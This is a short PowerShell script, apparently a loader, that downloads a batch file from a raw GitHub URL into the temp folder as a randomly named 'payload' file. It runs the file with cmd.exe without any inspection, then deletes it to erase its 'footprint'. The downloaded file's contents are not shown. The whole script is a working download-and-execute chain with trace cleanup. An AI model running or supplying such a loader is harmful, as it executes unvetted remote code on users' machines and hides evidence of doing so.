# ==============================================================================
# Remote Batch Script Loader
# ==============================================================================
$ErrorActionPreference = 'Stop'

# 1. Force TLS 1.2 support for legacy Windows PowerShell (5.1) environments
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# 2. Target URLs and file path destinations
$sourceUrl = 'https://raw.githubusercontent.com/DevJeffersonL/MAS/refs/heads/main/Sample.bat'
$tempFolder = [System.IO.Path]::GetTempPath()
$tempFile   = Join-Path -Path $tempFolder -ChildPath ("payload_{0}.bat" -f ([System.Guid]::NewGuid().ToString("N").Substring(0, 8)))

try {
    Write-Host "[*] Fetching remote batch script..." -ForegroundColor Cyan

    # 3. Stream and write the batch file to disk
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "PowerShell-Loader/1.0")
    $webClient.DownloadFile($sourceUrl, $tempFile)

    if (-not (Test-Path -Path $tempFile)) {
        throw "Download failed: Payload file not found on disk."
    }

    Write-Host "[+] Payload ready. Initializing execution..." -ForegroundColor Green

    # 4. Execute the batch file using cmd.exe and wait for it to finish
    $process = Start-Process -FilePath "$env:ComSpec" `
                             -ArgumentList "/c `"$tempFile`"" `
                             -WorkingDirectory $tempFolder `
                             -Wait `
                             -PassThru

    Write-Host "[+] Script execution finished (Exit Code: $($process.ExitCode))." -ForegroundColor DarkGray
}
catch {
    Write-Host "[!] Error encountered: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # 5. Clean up temporary footprint
    if (Test-Path -Path $tempFile) {
        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
    }
}
